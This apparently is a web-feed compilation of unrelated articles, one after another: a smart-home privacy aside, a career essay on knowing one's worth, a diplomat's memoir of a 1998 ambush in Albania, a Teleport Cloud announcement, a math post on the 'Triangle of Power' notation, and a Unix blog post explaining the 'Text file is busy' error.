protocol especially if the company has a history of shutting down services or
products. I’d also avoid large investments in new products by any company
unless they have a positive track record or can be controlled via a standard.</p><blockquote><p>If an online service doesn’t charge you a monthly fee, you are the product.
Products that have a free cloud dependency have to find a way to turn a
profit or they will shut down. Someone has to pay for the cloud services.</p></blockquote><p>I do feel comfortable sticking with HomeKit supported devices as I can control
them locally and Apple has a good track record of privacy, supporting devices,
and part of HomeKit was <a href="https://github.com/apple/HomeKitADK">open sourced</a> too.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              
              <p>The story I am going to share below has so many variations, but the lesson is always the same. This specific version I got from <a href="https://twitter.com/Shadaya_Knight_/status/1327881911214157825">Twitter</a>:</p><p>A father said to his son: "You've graduated with honors, here is a car (Nissan Skyline R34) that I bought years ago, it's old. BUT before I give it to you, take it to the USED CAR STORE &amp; tell them you want to sell it &amp; see how much they offer you. The son went to the USED CAR STORE, returned to his father &amp; said: "They offered me $1000 because it looks very worn out". The father said, "Now take it to the PAWN SHOP"...</p><p>The son went to the PAWN SHOP &amp; returned to his father &amp; said: "The PAWN SHOP offered $100 because it's a very old car". Then the father asked the son to go to a CAR CLUB &amp; show them the car. The son took the car to the CAR CLUB &amp; told his father: "Some people in the club offered as much as $100 000 for it since it's a NISSAN SKYLINE R34, an ICONIC car &amp; sought after by many"...</p><p>Then the father replied: "I wanted to let you know that the right place values you in the right way. Don't find yourself in the wrong place and get angry if you are not valued. Those that know your value are those who appreciate you, don't stay in a place where nobody sees your value. KNOW YOUR WORTH"</p><p>...</p><p>Immediately after graduating from college with a CS degree, I was on the hunt for a developer job. Lucky enough and through some personal connection I was able to land a front-end developer role.</p><p>I was so happy to have gotten that job that I did lowball myself when asked how much do I want to get paid...At that time I was interning and I was being paid $20 an hour...so I said to myself let's just say anything between $22/hr to $25/hr ...Guess what! That's exactly what I got paid. I met the president of the company after an interview, and after reviewing my offer he said...something like... what I said for my offer is around the same salary range people at the company start with ...They sent me an official offer letter just a few days after that...and I was offered $45k a year...You can imagine what was going through my mind...I lowballed myself...Why did I say $22/hr? ...I was happy to get the job but was kinda sad that I didn't capitalize on the opportunity. The reason was mainly that after graduation I was kinda desperate to get a job...I was out of the school dorms, I needed to have my own place, I needed to take care of my own expenses. So I was just ready for anything that would pay me.</p><p>After like 5 months of working in this job I wasn't so happy...I felt as if what I was doing did inspire me enough...That, plus a few other personal reasons led me to quit my job. Where I was interning when I was in college...by the time I was ending my time before my full-time job, the boss had upped my salary to $30/hr. What I was doing to my boss at the internship place was valuable enough for him to increase my salary without even asking and just after 5 months of working for him. This was one of the greatest lessons I learned...that Know Your Worth...There will be places where your skills are valued higher than other places. Find those places and people who value your skills.</p><p>...</p><p>Here is another story I had read a few months ago...it goes like this...There was a marathon in one of the US cities, and two people put their table stands where the runners would pass. One of them had oranges and another one had donuts...Almost all runners passed by the oranges station to grab the oranges and continue their race. Almost none grabbed the donuts. The reason is plain clear...the tired runners wanted some refreshing fluid in their body at the time...you really can't imagine a marathon runner grabbing a donut in the middle of the race, it's just not fitting. A fresh orange was a better offer to the runners. While the donut person had good intentions...he/she wasn't there at the right moment. Actually, at the finish line of the race, most of the runners wished there were some donuts there to greet them...but unfortunately, a donut person was nowhere to be found. So while a donut would be so valuable once the race was over, the oranges pretty much saved the day in the middle of the race. Again, know your value...know where you will be valued.</p><p>Are you a designer in a company that thinks design work is not as important as developing (programming) ...just get out...and find a place where designers are valued. Are you a developer that think they're not as valued as the business side of the company...you have an opportunity to go somewhere where your skills will be valued and you will be compensated accordingly.</p><p>So folks that's the lesson of the day...KNOW THY VALUE</p><blockquote>Everyone is a genius. But if you judge a fish by its ability to climb a tree, it will live its whole life believing that it is stupid</blockquote>

Police convoy enroute to ambush spot</figcaption></figure></div><p>The convoy stopped and the police got out of their vehicles and I joined them. Some started to cordon off the road while a number with automatic weapons spread out around the scene in some sort of haphazard search pattern looking for clues or traces of the culprits. After about half an hour just standing around, I asked my Embassy driver, Benny to ask the police if I could leave for the hospital to visit my colleagues. The senior policeman on the scene agreed but said he wanted me to visit police HQ later that day to make an initial statement.</p><p>After agreeing to do so and telling them that until further notice Benny would be my official interpreter for the time being, both he and I jumped in our vehicle and headed for the hospital in Tirana. I could see that Benny was nervous. Dealing with all of this was definitely not part of his job description. He was doing a great job not only as a driver putting himself in what might have been a potentially dangerous situation but also with helping out with the police.</p><p>About an hour later, after an uneventful trip, we arrived at the main hospital in Tirana. Benny and I went in and were taken to where the Deputy Head of Mission (DHM) and the Management Officer (MO) were being patched up. The doctor explained (via Benny) that the DHM was lucky, the bullet had gone through the fleshy part of her arm without breaking any bones or damaging any nerves. The doctor wanted to keep her in, but she was insistent of going home once the treatment was completed.</p><p>As for the MO, he was extremely lucky. When the bullet hit him, it had spent a lot of its force going through the window then the DHMâ€™s arm and upholstery before finally grazing him along the stomach resulting in blood loss. He too was insistent on discharging himself after treatment and going home. As for me, I was still in a state of disbelief that out of all the bullets fired, only one had done all this damage.</p><p>I had by then briefed both him and the DHM about what the police were currently doing plus the fact that I now had to go to police HQ to make a statement. I got Benny to call a second Embassy driver to bring the other armoured vehicle to the hospital to take both the DHM and MO home. We agreed that after I had been to police HQ, we would all meet up later in the DHMâ€™s house.</p><p>With that, Benny and I set off for police HQ. When I got there, I found that there were a small number of Albanian government officials gathered around a desk with senior police officers. Again thanks to Benny, I managed to give them a written statement of sorts as to what had happened.</p><p>After giving the statement, I was told to wait in another room. After about thirty minutes twiddling my thumbs, I was taken outside to a courtyard where a large number of heavily armed police were assembled. I wondered what was going on and asked Benny to try and find out, but nobody was talking.</p><p>Suddenly a door opened at the far end of the courtyard and a long file of men entered. They were directed to line up against the brick wall facing us. The police then told Benny that these men had been seized on and around the mountain during the police sweep.</p><p>Apparently, a number of them were well known to the police who described them as “hardened criminals” and the police were confident that one or several of them were definitely the culprits. When Benny told me all of this, I was not so certain.</p><p>Were these guys some sort of token show to prove the police were on the ball? How could I identify someone who was masked? I did not know for certain if there was just one man or a number of others involved in the shooting and I made a point of telling the police this.</p><p>They were not convinced or put off and they then asked me to go down the line and look at them. I refused and told them again I could not identify someone who had been wearing a mask throughout the incident?</p><p>However, one of the government officials sidled up to me and in perfect English said it was the custom and part of their procedures that a line up had to take place. Even if I could not identify anyone, the police would still hold and question them.</p><p>Of course, this being Albania at that time, there was no hiding behind a one-way mirror or any other form of masking my identity as a witness, so reluctantly, I started down the line. They were a dishevelled bunch and did not look too happy to be standing there. I had to stop in front of each one and say, “no, I was not sure and I could not be certain that this was the culprit”.</p><p>They all stared straight ahead and as I stopped in front of each individual and made my declaration, they all looked me straight in the eye, which was pretty unnerving to say the least.</p><p>Finally, I came to the end of the line. I again confirmed that I could not positively identify anyone and asked if I was free to go as I needed to meet up with my two colleagues. The police agreed and with a great deal of relief, both Benny and I left and headed for the DHMâ€™s house.</p><p>We made good time and when we reached her house, we found that she had already informed London of events. Word had quickly spread amongst the small diplomatic community in the city and she was dealing with well-wishers from her circle of diplomatic friends and also officials from the Albanian government who were in attendance.</p><p>I then briefed the DHM on what I had experienced at the Police HQ and seeing that she was going to be well looked after I set off with Benny to see the MO at his residence. It turned out that the MO was not at home but ensconced in the London Bar (a favourite watering hole for the small number of foreigners in Tirana at that time) regaling all and sundry with what had happened and showing everyone his battle scar.</p><p>What a guy, his prescription for a traumatic day, a couple of stiff drinks to settle the nerves in the face of adversity so to speak. Unfortunately, it turned out to be a lot more than a couple of quick drinks as more and more people turned up in the bar as the news spread to hear the story, see the MOâ€™s war wound and of course buy us more drinks (for medicinal and recuperative purposes of course) which were gratefully received.</p><p>In the end, they never did catch anyone. The shootings made the front page of the UK press and I was pretty sure the incident had been an embarrassment to the Albanian government who had seen virtually the whole UK establishment of the British Embassy (at that time there was only 4 <strong>British diplomats</strong> in residence) nearly wiped out on what was supposed to be (on their assurances) a safe route.<a href="https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html">https://www.independent.co.uk/news/albanian-gunmen-wound-british-diplomats-1156205.html</a></p><p>Locally, there was a lot of speculation and gossip about the event. People could not get their heads around the fact that even the local bad guys would not be stupid enough to hold up a diplomatically plated vehicle as this action would be sure to bring a firestorm of police activity down on them.</p><p>A story went around that we were in fact carrying a lot of cash and the purpose of our trip to the mountain was to buy back looted weapons (looted from military arsenals during civil unrest the previous year) from criminal elements in order to get them off the street as part of some sort UK government initiative.</p><p>Another story was that we went to meet some members of the nascent Kosovo Liberation Army in order to deliver a substantial amount of cash to aid them in their struggle against the Serbs in Kosovo.</p><p>Both stories of course were complete rubbish. However unglamorous, the fact was that we were the unlucky victims of an armed robbery/carjack that went wrong, we just happened to be in the wrong place at the wrong time. For me, I never did reconcile the fact that the only person actually physically robbed was myself, the lowest grade and the lowest paid of the whole party. Where is the justice in that? I dined out on that story for many a month to come.</p><p>In the days that followed, the DHM was evacuated back to the UK for further medical treatment. The FCO had managed to locate the holidaying Ambassador and he returned to post and both the MO and I went back to work as normal.</p><p>It is important to remember that this was the Albania of 1998 and not the Albania of 2020. I only spent a year in Tirana before my next posting to Kosovo but what an eventful year it turned out to be.</p><p>It was a time of change and upheaval. After decades of the brutal and repressive Hoxha communist regime, followed by the great national pyramid scheme which impoverished hundreds of thousands of Albanians not used to such criminal schemes losing everything, no wonder the country erupted into mass civil unrest.</p><p>But moving on from those dark days, I have been back to Albania twice since then. It is a beautiful and stunning country rich in history and the developing coastline is a tourist paradise. I still have friends from our embassy, local staff who I keep in contact with regularly even to this day via social media. If you ever get the chance…..go visit, you will not be disappointed.</p><p><a href="https://www.mydiplomaticlife.com/sas-rescue-trapped-diplomats-in-albania/">SAS Rescue 3 Trapped British Diplomats in Albania</a></p><p><a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p><a href="https://www.mydiplomaticlife.com/bloodshed-avoided-at-queens-birthday-party-in-tirana/">Bloodshed Avoided At Queens Birthday Party In Tirana</a></p></div></div>]]>

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-header.png" width="100%" alt="access points revollving around Teleport"></p>

<p>This blog post marks an important milestone for us! Just four years ago, as we grew frustrated with the state of SSH server access, Teleport was born. Eventually it grew way bigger than just SSH access, as our users want to use the same access workflow for all layers of their stacks.</p>

<p>And today we’re announcing another way to use Teleport: as a hosted offering. Let’s dig deeper!</p>

<h2 id="what-is-teleport">What is Teleport?</h2>

<p>For those who don’t know, Teleport is an open-source <a href="https://goteleport.com/teleport/">Unified Access Plane</a>, i.e. a smart proxy that understands all common remote access protocols. We’ve started with SSH and are adding others quickly. Available as a <a href="https://goteleport.com/teleport/download/">single binary download</a>, it allows engineers to access their servers, Kubernetes clusters, or internal web applications (dashboards, etc) regardless of where they are - on any cloud, behind NAT, in a self-driving car, anywhere.</p>

<p>Teleport started as an experiment of using Golang’s first-class SSH facilities for our own SSH access needs. Other companies noticed, and in just a couple of years it’s gone from just a handful of early adopters to organizations like NASDAQ, Snowflake, and IBM trusting Teleport to access their environments across any infrastructure.</p>

<p>Teleport gives the industry best practices for secure access by default: the SSH proxy, identity-centric authentication, <a href="https://goteleport.com/blog/enhanced-session-recording/">session recording</a>, structured <a href="https://goteleport.com/resources/videos/webinar-kubernetes-audit-logging/">audit log</a>, etc. This is how <a href="https://goteleport.com/blog/how-to-ssh-properly/">SSH is done properly</a> at Silicon Valley unicorns, usually with something built in-house. We wanted Teleport to be the standard access solution for the rest of the world.</p>

<p>Then we discovered that Kubernetes users face similar challenges and Teleport added support for <a href="https://goteleport.com/teleport/kubernetes/">Kubernetes access</a>, gradually turning into a multi-protocol access plane.</p>

<p>We always believed that <em>bad user experience and complexity are the biggest obstacles to good security</em>. That is why Teleport was designed to be simple and easy to use.</p>

<h2 id="cloud-early-access">Cloud Early Access</h2>

<p>From the beginning, we have adopted the design mindset to “do the right thing by default” to minimize the need for configuration and to reduce operational overhead of running Teleport on your infrastructure.</p>

<p>As easy as it is, some users still preferred that we do it for them. There’s a huge distance between “easy” and “one click away” and today, we’re closing this gap.</p>

<p>We are announcing early access to Teleport Cloud. Teleport Cloud allows you to simply copy-paste a single CLI command on your servers, regardless of where they are, and you’ll get SSH and Kubernetes access to all of your environments with industry best practices for security and compliance. Our security and compliance experts will run and manage the Unified Access Plane for you.</p>

<p>When we say all of your environments, we literally mean any computing device on planet Earth. Teleport Cloud gives you remote access connectivity into:</p>

<ul>
<li>Cloud and on-premise environments</li>
<li>IoT devices running on your customer’s premises behind NAT</li>
<li>Edge environments</li>
</ul>

<p>What do we mean by remote access connectivity? We mean full support for the following protocols:</p>

<ul>
<li>SSH</li>
<li>Kubernetes API</li>
<li>HTTPS for accessing internal web apps</li>
<li>Databases (coming soon)</li>
</ul>

<p>We called it Teleport because we wanted to get as close as possible to defeating the laws of physics. In other words, we set out to erase the annoying boundaries that currently exist between cloud providers and networks.</p>

<h2 id="how-does-it-work">How does it work?</h2>

<p>The underlying technology behind Teleport Cloud is reverse tunnels. A reverse tunnel is a persistent secure connection established by your servers into the Teleport control plane hosted by the team at Teleport.</p>

<p>When you type <code>ssh <a href="https://goteleport.com/cdn-cgi/l/email-protection" data-cfemail="5f2a2c3a2d1f31303b3a">[email&nbsp;protected]</a></code>, the Teleport client connects to the node via the SSH proxy hosted by us. The proxy routes your connection to the node using the tunnel. This allows you to SSH into nodes that are running behind NAT, even on third party infrastructure. This technology can be used not only to deploy software into your own clouds, but also to update software or firmware on appliances running in your customer’s clouds or even in their basements.</p>

<p>You can also log in into your Teleport Cloud account to access servers, review audit logs, and configure role-based access via the control panel. The audit log deserves a special mention. Having a centralized audit log with recorded sessions and instant visibility into your environment has always been a major reason for organizations to adopt Teleport.</p>

<p>The diagram below shows how this works:</p>

<p><img src="https://goteleport.com/blog/images/2020/teleport-cloud-1.png" width="100%" alt="how teleport cloud works"></p>

<p>Teleport Cloud is running on AWS. The audit logs are encrypted at rest and stored in DynamoDB and Amazon S3. We have also taken some measures to isolate Teleport Cloud tenants, so every Teleport Cloud instance is an isolated single tenant and is running as a standalone process with SELinux profile and a separate kIAM role using the industry <a href="https://github.com/gravitational/workshop/blob/master/k8ssecurity.md">best security practices</a>.</p>

<h2 id="faq">FAQ</h2>

<p><strong>Q: Can the Teleport Team decrypt and see my SSH traffic?</strong>
<strong>A:</strong> No. We cannot see your SSH traffic, because encryption happens end-to-end, i.e. from your client machines to your servers.</p>

<p><strong>Q: Early Access? Is this production-ready?</strong>
<strong>A:</strong> Teleport itself has been in production at organizations like Samsung, Snowflake, and IBM, and Teleport Cloud is the same product, just hosted by us. We are hand-selecting early Cloud users because Teleport Cloud isn’t yet available in every geographic region and also because we want more UX feedback before we make it generally available.</p>

<p><strong>Q: Can I use Teleport Cloud Preview in production?</strong>
<strong>A:</strong> We expect Teleport Cloud to be suitable to use in non mission critical systems that do not require <sup>24</sup>⁄<sub>7</sub> access or a guaranteed SLA. We recommend a fallback option be available in the event of error or outage.</p>

<p><strong>Q: Are you using AWS-managed encryption keys, or CMKs via KMS?</strong>
<strong>A:</strong> We use AWS-managed keys. Currently there is no option to provide your own key.</p>

<h2 id="starting-with-teleport-cloud">Starting with Teleport Cloud</h2>

<p>If you’re interested in trying a fully hosted Teleport, or simply want to hear more, please <a href="https://goteleport.com/teleport/cloud/">reserve your spot</a> on the waiting list!</p>

<p>Initially, we are focusing on the most common US-based hosting regions, but we need more input from you on where to go next. Teleport will not be worthy of its name until you can instantly “teleport” your software <a href="https://goteleport.com/resources/white-papers/environment-free-computing/">anywhere you want</a>!</p>

		<p>The web is full of amazing and surprising creations. One such creation that has caught my attention lately was a video by 3Blue1Brown on the so-called “Triangle of Power”.</p>
<p><iframe width="720" height="405" src="https://www.youtube.com/embed/sULa9Lc4pck" frameborder="0" allowfullscreen=""></iframe></p>
<p>Apparently, the ideas originated on <a href="http://math.stackexchange.com/questions/30046/alternative-notation-for-exponents-logs-and-roots" target="_blank">a Math Stack Exchange thread</a> asking for more unified notations for exponents, logarithms and radicals. Indeed, while these formulas $2^3 = 8$, $\sqrt[3]{8} = 2$ and $\log_2 8 = 3$ are all discussing the same relationship that holds between 2, 3 and 8, they look so different that a student may not witness their commonality.</p>
<p>I see. So, the question is whether there could be a more explicit notations to unify and better visualize this relationship…</p>
<p>Yes indeed. One alternative notation has gained much interest. It is the so-called <strong>Triangle of Power</strong>. In our case, this triangle of power can depict the relationship between 2, 3 and 8 in a wonderfully compact and harmonious way, namely by denoting $_2\overset{3}{\Delta}_8$.</p>
<p>And that triangle $_2\overset{3}{\Delta}_8$ is a formula?</p>
<p>No! It’s more like an identity in itself. To perform computations, it might be useful to move one of the entries of the triangle to the other side of an equal sign as follows:<br>
$$_2\overset{3}{\Delta}_8 \Longleftrightarrow \; _2\overset{3}{\Delta} = 8\Longleftrightarrow \overset{3}{\Delta}_8 = 2\Longleftrightarrow \; _2\Delta_8 = 3.$$</p>
<p>3Blue1Brown argues that this beautiful notation greatly simplifies the understanding of the mathematical underlying objects, namely exponents, logarithms and radicals. This claim is quite disturbing at first. Indeed, again and again, I had to translate the equations of his video into equations in terms of the notations I am more familiar with. I could not think in terms of the triangle of power.</p>
<p>So you think it’s a bad notation…</p>
<p>Actually, no. This just helped realize how dependent on current flawed notations my mathematical thinking was! That’s not good! Moreover, I did get stunned by some of the many artful equations that this new notation yielded, e.g.<br>
$$_x\overset{y}{\Delta}_{_x\overset{y}{\Delta}}, \; _x\overset{_x\Delta_z}{\Delta}_z, \; _{\overset{y}{\Delta}_z}\overset{y}{\Delta}_z, \; \overset{+}{\Delta}_\times, \;  _\times\Delta_\times, \; _\times\overset{\oplus}{\Delta}, \; _x\overset{y}{\Delta} = \overset{1/y}{\Delta}_x, \; _{_x\overset{y}{\Delta}}\overset{z}{\Delta}_{_x\overset{yz}{\Delta}}, \; _x\Delta_y \; _y\Delta_z = \; _x\Delta_z, \; _e\overset{i\tau}{\Delta}_1, \; _e\overset{i\tau/4}{\Delta}_i \ldots $$</p>
<p>By the end of the video, I got hooked.</p>
<p>Even though you couldn’t follow the computations…</p>
<p>That’s true. And it would have been hypocritical of me to claim that they were indeed the way to go, if I had not yet experienced the actual benefaction of using and thinking in terms of this triangle of power. Following 3Blue1Brown’s advice, it seemed that the only way for me to do so is to go explore and play with the triangle of power. So I gave myself homeworks.</p>
<p>What homework?</p>
<p>I’ve decided to redefine and rederive well-known results about exponents, logarithms and radicals. And since I love the web, I couldn’t not share it with you.  Enjoy!</p>
<h2>Defining the Triangle of Power</h2>
<p>Let us start from the bottom. We’ll assume that integers and real numbers have been well-defined, as well as the addition and the multiplication. In this section, we’ll redefine the triangle of power $_x\overset{y}{\Delta}_z$ for all $x,z &gt; 0$ and $y \in \mathbb R$. It won’t be straightforward though. The first step is to define the triangle of power for top integer values of $y$, then for top rational values, and finally we shall use continuity to generalize it for real tops.</p>
<p>OK… Let’s start with integer tops.</p>
<p>Let’s define $_x\overset{n}{\Delta}$ for all $x &gt; 0$ <a href="http://www.science4all.org/article/proof-by-induction/" target="_blank">by induction</a> on $n$. For $n=0$, we define $_x\overset{0}{\Delta}_1$, and we consider the induction $_x\overset{n\pm 1}{\Delta}_{x^{\pm 1} \times \overset{n}{_x\Delta}}$. We indeed use the “+” sign to define induction over positive integers, and the “-” sign for induction over negative integers.</p>
<p>Wait… Are you sure you’ve given an actual inductive definition?</p>
<p>Getting used to the meaning of the compact triangle-of-power notation is likely to be troublesome at first. What we really mean in terms of equations is that we define respectively $_x\overset{0}{\Delta} = 1$ and $_x\overset{n\pm1}{\Delta} = x^{\pm1} \times\; _x\overset{n}{\Delta}$. More generally, we have<br>
$$_x\overset{n}{\Delta}_y \Longleftrightarrow \; _x\overset{n}{\Delta} = y\Longleftrightarrow \overset{n}{\Delta}_y = x\Longleftrightarrow \; _x\Delta_y = n.$$ From this definition, it follows straightforwardly that $_1\overset{n}{\Delta}_1$, $\;_x\overset{m+n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{n}{\Delta}$, $\; _x\overset{-n}{\Delta} = \;_{1/x}\overset{n}{\Delta} = \;\left( _x\overset{n}{\Delta} \right)^{-1}$ and that $x \mapsto \;_x\overset{n}{\Delta}$ is strictly increasing for $n \geq 1$ (and thus injective).</p>
<p>I think I follow…</p>
<p>Take your time. These notations can be very troubling.</p>
<p>Sure. You can move on.</p>
<p>Let us now a prove our first beautiful theorem. For $x&gt;0$ and $n,m\in \mathbb Z$, we have $_{_x\overset{m}{\Delta}}\overset{n}{\Delta}_{_x\overset{mn}{\Delta}}$. I cannot help to comment on how cool I think that this elegantly structured notation is a theorem! We prove this by induction on $n$. The case $n=0$ boils down to the definition of the triangle of power for zero top value. Assuming that the result holds for $n$, we now have, using the induction definition of the triangle of power, $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta} = \;_x\overset{m}{\Delta} \; \times\, _{_x\overset{m}{\Delta}}\overset{n}{\Delta} = \;_x\overset{m}{\Delta} \times\, _x\overset{mn}{\Delta} = \;_x\overset{m(n+1)}{\Delta}$. This equality can be equivalently rewritten as $_{_x\overset{m}{\Delta}}\overset{n+1}{\Delta}_{_x\overset{m(n+1)}{\Delta}}$, which concludes the induction proof.</p>
<p>There is elegance in the notation indeed…</p>
<p>I know! Here’s another beautiful theorem. For all $x,y &gt; 0$ and $m,n \in \mathbb Z$, we have $_x\overset{n}{\Delta}_{y} \Longleftrightarrow \; _x\overset{mn}{\Delta}_{_y\overset{m}{\Delta}}$. Using the previous result, we see that the right-hand side is equivalent to $_{_x\overset{n}{\Delta}}\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. For the left-to-right implication we can replace the left of the main triangle by $y$, yielding $_y\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$, which is equivalent to $_y\overset{m}{\Delta} = \; _y\overset{m}{\Delta}$, which is clearly true. To go from right to left, we notice that $z = y$ is a solution of $_z\overset{m}{\Delta}_{_y\overset{m}{\Delta}}$. Yet the map $z \mapsto \; _z\overset{m}{\Delta}$ is injective, thus it is the only solution. Thus $_x\overset{n}{\Delta} = y$, which concludes the proof for positive integers $n$. </p>
<p>Cool! And I guess that the case for negative integers $n$ is dealt with similarly.</p>
<p>Yes! The theorem we’ve just proved can now be used to define the triangle power for rational tops. For $p \in \mathbb Z$ and $q \in \mathbb Z^*$, we define $_x\overset{p/q}{\Delta}_{y}$ if $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}}$. To prove the consistency of this definition, we need to make sure that it holds for any $p’,q’$ instead of $p,q$, whenever $p’/q’ = p/q$. To prove this it suffices to show that $_x\overset{p/q}{\Delta}_{y} \Longleftrightarrow _x\overset{kp/kq}{\Delta}_y$, i.e. $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$. But this boils down to applying the two previous theorems. Indeed, $_x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow\; _x\overset{kp}{\Delta}_{_{_y\overset{q}{\Delta}}\overset{k}{\Delta}} \Longleftrightarrow \;_x\overset{kp}{\Delta}_{_y\overset{kq}{\Delta}}$.</p>
<p>Cool! Top integers, checked. Top rationals, checked. All we have left to define are top reals!</p>
<p>Yes. But to get there, we’ll need to first prove another beautiful theorem: $_x\overset{p/q}{\Delta}_y \Longleftrightarrow \; _x\overset{p}{\Delta}_{_y\overset{q}{\Delta}} \Longleftrightarrow \; _x\overset{p}{\Delta} = \; _y\overset{q}{\Delta} \Longleftrightarrow \; _y\overset{q}{\Delta}_{_x\overset{p}{\Delta}} \Longleftrightarrow \; _y\overset{q/p}{\Delta}_x$. In other words, by fixing $r = p/q$, we obtain the reflection theorem. For $x,y &gt; 0$ and $r \in \mathbb Q^*$, we have $_x\overset{r}{\Delta}_y \Longleftrightarrow \; _y\overset{1/r}{\Delta}_x$. This is so pretty! Moreover, by continuity, in the next section, we’ll see that this holds for nonzero real tops as well.</p>
<p>Are we now ready to define the triangle of power for top reals?</p>
<p>Almost! We now need to prove that for any $x\geq 1$, we have $_x\overset{1/n}{\Delta} \rightarrow 1$. Notice to start with that $_x\overset{1/n}{\Delta} \geq 1$. Now we consider $\epsilon &gt; 0$. Then it is easy to see that $_{1+\epsilon}\overset{n}{\Delta} \rightarrow \infty$. In particular, there exists $N$ large enough so that $_{1+\epsilon}\overset{N}{\Delta} \geq x$. Moreover, for $n \geq N$, we have $_{1+\epsilon}\overset{n}{\Delta} \geq x$. By montonicity of the triangle power, this means that $1+\epsilon \geq \overset{n}{\Delta}_x = \;_x\overset{1/n}{\Delta} \geq 1$. This corresponds exactly to saying that $_x\overset{1/n}{\Delta} \rightarrow 1$. Using $_{1/x}\overset{1/n}{\Delta} = \left(\; _x\overset{1/n}{\Delta} \right)^{-1}$ and monotonocity, we can generalize this result for all $x&gt;0$ and rational top. Namely, for any $x&gt;0$ and $\epsilon &gt;0$, there exists some $\delta&gt;0$ such that for any rational $r \in (1-\delta,1+\delta) \cap \mathbb Q$, we have $\left|\;_x\overset{r}{\Delta} – 1\right| \leq \epsilon$.</p>
<p>In other words, the right side of the triangle of power is sort of continuous with respect to rational tops.</p>
<p>This is almost what we’ve proved, and exactly where I’m going with that! Let’s show that if a rational sequence $r_n$ converges, then, for all $x &gt; 0$, the sequence $_x\overset{r_n}{\Delta}$ converges too. We have $ \left| \; …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>What is behind Unix's 'Text file is busy' error</h2>

	<p><small>April  6, 2016</small></p>
</div><div><p>Perhaps you have seen this somewhat odd Unix error before:</p>


<blockquote><pre># cp prog /usr/local/bin/prog
cp: cannot create regular file 'prog': Text file is busy
</pre>
</blockquote>

<p>This is not just an unusual error message, it's also a rare instance
of Unix being friendly and not letting you blow your foot off with
a perfectly valid operation that just happens to be (highly) unwise.
To understand it, let's first work out what exact operation is
failing. I'll do this with <code>strace</code> on Linux, mostly because it's
what I have handy:</p>

<pre>$ cp /usr/bin/sleep /tmp/
$ /tmp/sleep 120 &amp;
$ strace cp /usr/bin/sleep /tmp/
[...]
open("/usr/bin/sleep", O_RDONLY)        = 3
fstat(3, {st_mode=S_IFREG|0755, st_size=32600, ...}) = 0
open("/tmp/sleep", O_WRONLY|O_TRUNC)    = -1 ETXTBSY (Text file busy)
[...]
</pre>

<p>There we go. <code>cp</code> is failing when it attempts to open <code>/tmp/sleep</code>
for writing and truncate it, which we have a running program, and
the specific Unix errno value here is <code>ETXTBSY</code>. If you experiment
some more you'll discover that we're allowed to remove <code>/tmp/sleep</code>
if we want to, just not write to it or truncate it (at least on
Linux; the specifics of what's disallowed may vary slightly on other
Unixes). This is an odd limitation for Unix, because normally there's
nothing that prevents one process from modifying a file out from
underneath another process (even in harmful ways). Unix leaves it
up to the program(s) involved to coordinate things between themselves,
rather than enforcing a policy of 'no writing if there are readers'
or something in the kernel.</p>

<p>But running processes are special, because really bad things usually
happen if you modify the on-disk code of a running process. The
problem is virtual memory, or more exactly paged virtual memory.
On a system with paged virtual memory, programs aren't loaded into
RAM all at once and then kept there; instead they're paged into RAM
in bits and pieces as bits of code (and data) are needed.  In fact,
some times already-loaded bits and pieces are dropped from RAM in
order to free up space, since they can always be loaded back in from
disk.</p>

<p>Well, they can be loaded back in from disk if some joker hasn't
gone and changed them on disk, at least. All of this paging programs
into RAM in sections only works if the program's file on disk doesn't
ever change while the program is running. If the kernel allowed
running programs to change on disk, it could wind up loading in one
page of code from version 1 of the program and another page from
version 2. If you're lucky, the result would segfault. If you're
unlucky, you might get silent malfunctions, data corruption, or
other problems. So for once the Unix kernel does not let you blow
your foot off if you really want to; instead it refuses to let you
write to a program on disk if the program is running. You can
truncate or overwrite any other sort of file even if programs are
using it, just not things that are part of running programs. Those
are special.</p>

<p>Given the story I've just told, you might expect <code>ETXTBSY</code> to
have appeared in Unix in or around 3BSD, which is more or less the
first version of Unix with paged virtual memory. However, this is
not the case. <code>ETXTBSY</code> turns out to be much older than BSD Unix,
going back to at least Research V5. Research Unix through V7 didn't
have paged virtual memory (it only swapped entire programs in and
out), but apparently the Research people decided to simplify their
lives by basically locking the files for executing programs against
modification.</p>

<p>(In fact Research Unix was stricter than modern Unixes, as it looks
like you couldn't delete a program's file on disk if it was running.
That section of the kernel code for <code>unlink()</code> gets specifically
commented out no later than 3BSD, <a href="http://minnie.tuhs.org/cgi-bin/utree.pl?file=3BSD/usr/src/sys/sys/sys4.c">cf</a>.)</p>

<p>PS: the 'text' in 'text file' here actually means 'executable code',
per say <code>size</code>'s output. Of course it's not just the actual executable
code that could be dangerous if it changed out from underneath a
running program, but there you go.</p>

<h3>Sidebar: the way around this if you're updating running programs</h3>

<p>To get around this, all you have to do is remove the old file before
writing the new file into place. This (normally) doesn't cause any
problems; the kernel treats the 'removed but still being used by a
running program' executable the same way it treats any 'removed but
still open' file. <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/UnixPendingDeleteProblem">As usual</a> the file
is only actually removed when the last reference goes away, in this
case the last process using the old executable exits.</p>

<p>(Of course <a href="https://utcc.utoronto.ca/~cks/space/blog/unix/NFSPendingDeletes">NFS throws a small monkey wrench into things</a>, sometimes in <a href="https://utcc.utoronto.ca/~cks/space/blog/sysadmin/SafelyUpdatingNFSFilesII">more than one way</a>.)</p>

